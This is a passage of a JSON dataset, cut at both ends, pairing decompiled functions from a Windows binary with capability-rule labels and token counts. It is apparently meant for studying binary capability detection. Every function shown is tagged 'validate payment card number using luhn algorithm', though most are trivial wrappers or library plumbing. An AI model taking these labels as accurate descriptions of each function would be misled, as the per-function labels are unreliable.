        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419cc0(uint arg_8h)\n\n{\n    fcn.00401440(arg_8h);\n    fcn.004150a0();\n    return;\n}\n",
        "token_count": 43
    },
    "00419ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419ce0(uint arg_8h)\n\n{\n    fcn.00401440(arg_8h);\n    fcn.004161a0();\n    return;\n}\n",
        "token_count": 43
    },
    "00419d00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419d00(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471488;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00416d60(uVar1);\n    var_4h = 0;\n    arg_8h_00 = fcn.00401440(&arg_8h);\n    fcn.0041a090(arg_8h_00);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 208
    },
    "0041a090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0041a090(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = fcn.00418950(arg_8h);\n    if (cVar1 != '\\0') {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.0041a1d0(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "6ee705f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nmethod.std::_Func_impl_no_alloc_class_std::_Fake_no_copy_callable_adapter_class__lambda_6ee705f6690b86e437cca091e509d567____void___.virtual_4\n          (uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401300(8, arg_8h);\n    arg_8h_00 = fcn.00401440(in_ECX + 4);\n    fcn.0041a3c0(arg_8h_00);\n    return;\n}\n",
        "token_count": 146
    },
    "0041a180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a180(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401300(8, arg_8h);\n    fcn.0041a400(in_ECX + 4);\n    return;\n}\n",
        "token_count": 75
    },
    "0041a1d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a1d0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00402930();\n    fcn.00401300(8, uVar1);\n    uVar1 = fcn.00401440(arg_8h);\n    uVar1 = fcn.0041a3c0(uVar1);\n    fcn.0040f2f0(uVar1);\n    return;\n}\n",
        "token_count": 119
    },
    "0041a3c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.0041a3c0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = \n    vtable.std::_Func_impl_no_alloc_class_std::_Fake_no_copy_callable_adapter_class__lambda_6ee705f6690b86e437cca091e509d567____void___.0\n    ;\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00419c30(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 146
    },
    "0041a400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.0041a400(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = \n    vtable.std::_Func_impl_no_alloc_class_std::_Fake_no_copy_callable_adapter_class__lambda_6ee705f6690b86e437cca091e509d567____void___.0\n    ;\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.0041a860(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 144
    },
    "0041a590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a590(uint *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = 0x4864a4;\n    fcn.00406250(uVar1);\n    fcn.004264ce();\n    fcn.0040e930();\n    fcn.00413600();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 182
    },
    "0041a7a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a7a0(uint *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = 0x4864b0;\n    fcn.00406250(uVar1);\n    fcn.004264ce();\n    fcn.0040e930();\n    fcn.00413600();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 184
    },
    "0041a860": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a860(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00419c50(arg_8h_00);\n    fcn.004567ea();\n    return in_ECX;\n}\n",
        "token_count": 90
    },
    "0041a950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041a950(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    fcn.004135e0();\n    *in_ECX = 0x4864a4;\n    fcn.00411190(arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 76
    },
    "0041a980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0041a980(uint param_1)\n\n{\n    uint arg_8h;\n    uint var_4h;\n    \n    arg_8h = 1;\n    fcn.00406250(1, param_1);\n    fcn.00414670(arg_8h);\n    return;\n}\n",
        "token_count": 87
    },
    "0041a9c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041a9c0(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    fcn.004135e0();\n    *in_ECX = 0x4864b0;\n    fcn.00411190(arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 78
    },
    "0041aa10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041aa10(int32_t param_1)\n\n{\n    char cVar1;\n    uint32_t arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470ed8;\n    var_ch = *in_FS_OFFSET;\n    arg_8h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00416660(param_1 + 0x14);\n    var_4h = 0;\n    cVar1 = fcn.00414990();\n    if (cVar1 == '\\0') {\n        *(param_1 + 4) = 1;\n        var_4h = 0xffffffff;\n        fcn.00416620();\n    }\n    else {\n        var_4h = 0xffffffff;\n        fcn.00416620();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h);\n    return;\n}\n",
        "token_count": 277
    },
    "0041aac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041aac0(int32_t param_1)\n\n{\n    uint32_t arg_8h;\n    uint var_14h;\n    uint var_ch;\n    uint var_10h;\n    uint var_8h;\n    uint arg_8h_00;\n    uchar auStack108 [28];\n    uint uStack80;\n    uint in_stack_ffffffb8;\n    uchar auStack68 [40];\n    uint var_18h;\n    uchar *puStack24;\n    uchar *puStack20;\n    uchar *var_ch_2;\n    int32_t var_8h_2;\n    uint var_1h;\n    \n    puStack20 = &stack0xffffffbc;\n    var_ch_2 = &stack0xffffffbc;\n    puStack24 = &stack0xffffff94;\n    arg_8h_00 = *(param_1 + 0xc);\n    var_8h_2 = param_1;\n    fcn.0041abf0(arg_8h_00);\n    var_18h = fcn.004150c0(var_ch_2, arg_8h_00);\n    var_1h._0_1_ = fcn.0041ac80(in_stack_ffffffb8);\n    arg_8h = var_1h;\n    uStack80 = 0x41ab12;\n    fcn.00406250();\n    uStack80 = 0x41ab19;\n    fcn.00416b80(arg_8h);\n    return;\n}\n",
        "token_count": 357
    },
    "0041ab20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041ab20(int32_t param_1)\n\n{\n    uint32_t arg_8h;\n    uint var_14h;\n    uint var_ch;\n    uint var_10h;\n    uint var_8h;\n    uint arg_8h_00;\n    uchar auStack108 [28];\n    uint uStack80;\n    uint in_stack_ffffffb8;\n    uchar auStack68 [40];\n    uint var_18h;\n    uchar *puStack24;\n    uchar *puStack20;\n    uchar *var_ch_2;\n    int32_t var_8h_2;\n    uint var_1h;\n    \n    puStack20 = &stack0xffffffbc;\n    var_ch_2 = &stack0xffffffbc;\n    puStack24 = &stack0xffffff94;\n    arg_8h_00 = *(param_1 + 0xc);\n    var_8h_2 = param_1;\n    fcn.0041ab80(arg_8h_00);\n    var_18h = fcn.004150c0(var_ch_2, arg_8h_00);\n    var_1h._0_1_ = fcn.0041ac80(in_stack_ffffffb8);\n    arg_8h = var_1h;\n    uStack80 = 0x41ab72;\n    fcn.00406250();\n    uStack80 = 0x41ab79;\n    fcn.00416b80(arg_8h);\n    return;\n}\n",
        "token_count": 356
    },
    "0041ab80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ab80(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471488;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00416d60(uVar1);\n    var_4h = 0;\n    arg_8h_00 = fcn.00401440(&arg_8h);\n    fcn.0041ad40(arg_8h_00);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 208
    },
    "0041abf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041abf0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471488;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00416d60(uVar1);\n    var_4h = 0;\n    arg_8h_00 = fcn.00401440(&arg_8h);\n    fcn.0041ad80(arg_8h_00);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 209
    },
    "0041ac60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ac60(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.0041ad20(arg_8h_00);\n    return;\n}\n",
        "token_count": 66
    },
    "0041ac80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041ac80(uint arg_8h)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    uStack12 = 0x471a00;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    iVar1 = fcn.00406250();\n    fcn.00414300(iVar1 + 200);\n    var_4h._0_1_ = 1;\n    fcn.00417420();\n    var_4h = var_4h._1_3_ << 8;\n    fcn.00414330();\n    var_4h = 0xffffffff;\n    fcn.0040de60();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 283
    },
    "0041ad20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ad20(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.0041af00(arg_8h_00);\n    return;\n}\n",
        "token_count": 66
    },
    "0041ad40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0041ad40(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = fcn.00418950(arg_8h);\n    if (cVar1 != '\\0') {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.0041af40(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "0041ad80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0041ad80(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = fcn.00418950(arg_8h);\n    if (cVar1 != '\\0') {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.0041af90(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "0041aea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041aea0(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401300(8, arg_8h);\n    fcn.0041afe0(in_ECX + 4);\n    return;\n}\n",
        "token_count": 75
    },
    "0041aed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041aed0(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401300(8, arg_8h);\n    fcn.0041b020(in_ECX + 4);\n    return;\n}\n",
        "token_count": 75
    },
    "0041af00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041af00(uint arg_8h)\n\n{\n    fcn.00401440(arg_8h);\n    fcn.0041b060();\n    return;\n}\n",
        "token_count": 43
    },
    "0041af40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041af40(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00402930();\n    fcn.00401300(8, uVar1);\n    uVar1 = fcn.00401440(arg_8h);\n    uVar1 = fcn.0041b020(uVar1);\n    fcn.0040f2f0(uVar1);\n    return;\n}\n",
        "token_count": 115
    },
    "0041af90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041af90(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00402930();\n    fcn.00401300(8, uVar1);\n    uVar1 = fcn.00401440(arg_8h);\n    uVar1 = fcn.0041afe0(uVar1);\n    fcn.0040f2f0(uVar1);\n    return;\n}\n",
        "token_count": 115
    },
    "0041afe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.0041afe0(uint arg_8h)\n\n{\n    code **ppcVar1;\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = vtable.std::_Func_impl_no_alloc_class__lambda_8631d98553bef38a416bc3f062934a92___void___.0;\n    ppcVar1 = fcn.00401440(arg_8h);\n    in_ECX[1] = *ppcVar1;\n    return in_ECX;\n}\n",
        "token_count": 128
    },
    "0041b020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.0041b020(uint arg_8h)\n\n{\n    code **ppcVar1;\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = vtable.std::_Func_impl_no_alloc_class__lambda_55d7a76ff9ef1ba2590ace9f1f34e2e1___void___.0;\n    ppcVar1 = fcn.00401440(arg_8h);\n    in_ECX[1] = *ppcVar1;\n    return in_ECX;\n}\n",
        "token_count": 134
    },
    "0041b080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0041b080(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_1h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.0041b0d0(arg_8h_00);\n    return;\n}\n",
        "token_count": 91
    },
    "0041b0b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b0b0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.0041b100(arg_8h_00);\n    return;\n}\n",
        "token_count": 68
    },
    "0041b0d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b0d0(uint arg_8h)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00401440(arg_8h);\n    uVar1 = fcn.0041b140(uVar1);\n    fcn.0041b120(uVar1);\n    return;\n}\n",
        "token_count": 75
    },
    "0041b100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b100(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.0041b160(arg_8h_00);\n    return;\n}\n",
        "token_count": 66
    },
    "0041b120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b120(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.0041b180(arg_8h_00);\n    return;\n}\n",
        "token_count": 66
    },
    "0041b140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b140(uint arg_8h)\n\n{\n    fcn.00401440(arg_8h);\n    return;\n}\n",
        "token_count": 34
    },
    "0041b160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b160(uint arg_8h)\n\n{\n    fcn.00401440(arg_8h);\n    fcn.00419620();\n    return;\n}\n",
        "token_count": 42
    },
    "0041b180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b180(uint arg_8h)\n\n{\n    fcn.00401440(arg_8h);\n    fcn.004158e0();\n    return;\n}\n",
        "token_count": 43
    },
    "0041b3f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041b3f0(uint arg_8h, uint arg_ch)\n\n{\n    uint var_4h;\n    \n    fcn.0041be30(arg_8h, arg_ch);\n    return arg_8h;\n}\n",
        "token_count": 56
    },
    "0041b6c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b6c0(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = fcn.00404990();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00401440(arg_8h);\n        puVar3 = fcn.00404940(uVar2);\n        fcn.0041c060(*puVar3);\n    }\n    else {\n        uVar2 = fcn.00401440(arg_8h);\n        fcn.0041b720(uVar2);\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "0041b720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0041b720(uint arg_8h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint noname_0;\n    int32_t *piVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00401440(arg_8h);\n    puVar2 = fcn.00404940();\n    uVar3 = fcn.00401440(*puVar2);\n    noname_0 = fcn.00404960();\n    fcn.0041c030(noname_0, uVar3, uVar1);\n    puVar2 = fcn.00404940();\n    uVar1 = *puVar2;\n    puVar2 = fcn.00404940(uVar1);\n    uVar3 = *puVar2;\n    fcn.00404980(uVar3);\n    puVar2 = fcn.00404940();\n    piVar4 = fcn.00404940(uVar3, uVar1, *puVar2);\n    *piVar4 = *piVar4 + 0x18;\n    return;\n}\n",
        "token_count": 279
    },
    "0041bb20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041bb20(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint uVar2;\n    uint var_7ch;\n    uint var_64h;\n    uint var_60h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470320;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = 0x50;\n    var_10h = uVar1;\n    fcn.00401b10(0x50);\n    fcn.00403a50(uVar2, uVar1);\n    arg_8h_00 = &var_7ch;\n    uVar2 = fcn.004039c0(arg_8h_00, arg_ch);\n    uVar2 = fcn.00401440(uVar2);\n    fcn.004056d0(uVar2);\n    fcn.004055f0();\n    fcn.00403a10();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 322
    },
    "0041be20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041be20(int32_t arg_8h)\n\n{\n    return arg_8h + 0x2a;\n}\n",
        "token_count": 36
    },
    "0041bee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041bee0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470508;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00405100(var_10h);\n    var_4h = 0;\n    iVar1 = fcn.00407260(arg_ch);\n    iVar2 = fcn.00404d90();\n    arg_8h_00 = fcn.00401440(iVar1 + iVar2);\n    fcn.004092c0(arg_8h_00);\n    fcn.0040af70(arg_ch);\n    fcn.004093f0(arg_10h);\n    fcn.00405010(&var_28h);\n    var_4h = 0xffffffff;\n    fcn.00404f30();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_ch);\n    return;\n}\n",
        "token_count": 327
    },
    "0041bfb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bfb0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0041c240(0, arg_ch);\n    uVar1 = fcn.00401440(uVar1);\n    fcn.00405010(uVar1);\n    return arg_8h;\n}\n",
        "token_count": 95
    },
    "0041bff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bff0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00409870(arg_10h);\n    uVar1 = fcn.00401440(uVar1);\n    fcn.00405010(uVar1);\n    return arg_8h;\n}\n",
        "token_count": 92
    },
    "0041c030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c030(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h;\n    uint var_4h;\n    \n    fcn.00401300(0x18, arg_ch);\n    arg_8h = fcn.00401440(arg_10h);\n    fcn.00407620(arg_8h);\n    return;\n}\n",
        "token_count": 91
    },
    "0041c060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
